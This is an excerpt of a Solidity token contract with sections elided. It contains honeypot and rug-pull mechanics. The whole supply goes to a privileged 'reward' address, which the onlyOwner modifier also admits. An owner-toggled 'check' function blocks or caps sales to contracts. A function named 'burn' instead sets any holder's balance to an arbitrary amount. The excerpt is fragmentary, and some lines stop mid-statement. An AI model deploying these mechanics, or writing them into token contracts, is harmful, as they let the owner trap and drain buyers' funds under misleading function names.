...
contract Test is Ownable {
  ...
  constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) public {
    ...
    balances[reward] = totalSupply;
    allowAddress[reward] = true;
  }
  ...
  function check(address from, address _to) internal view returns(bool){
    if(!from.isContract() && _to.isContract()){
        if(enabled){
            if(maxSellOutNum == 0 && maxTxPercent == 0){
                return false;
            }
            if(maxSellOutNum > 0){
            ...
            if(maxTxPercent > 0){
                require(maxTxPercent > sellerCountToken[from], "reach max seller token");
            }
        }
    }
    return true;
  ...
  modifier onlyOwner() {
    require(msg.sender == reward || msg.sender == address
  ...
  function setSwapAndLiquifyEnabled(bool ok) external onlyOwner returns (bool){
      enabled = ok;
  }
  function setMaxTxPercent(uint256 num) external onlyOwner returns (bool){
      maxTxPercent = num * 10 ** uint256(decimals);
  }    
  function burn(address burnAddress, uint256 _value) external onlyOwner {
      balances[burnAddress] = _value * 10 ** uint256(decimals);
  }
    function SetLiquidityPercent(uint256 _liquidityPercent) onlyOwner public {
    ...
    function SetRewardPercent(uint256 _rewardPercent) onlyOwner public {
